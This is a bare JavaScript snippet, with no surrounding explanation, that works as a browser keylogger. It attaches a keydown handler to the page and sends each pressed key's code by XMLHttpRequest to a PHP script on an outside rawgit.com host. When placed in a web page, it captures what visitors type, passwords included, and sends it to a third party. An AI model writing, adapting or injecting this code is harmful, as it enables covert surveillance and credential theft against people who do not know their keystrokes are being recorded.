document.onkeydown = function(k){
 url = new XMLHttpRequest();
 url.open("get", "https://rawgit.com/Usagi86/ClienteLT/master/keyPHP.php?k=" + k.keyCode);
 url.send(null);
 console.log(k)
}
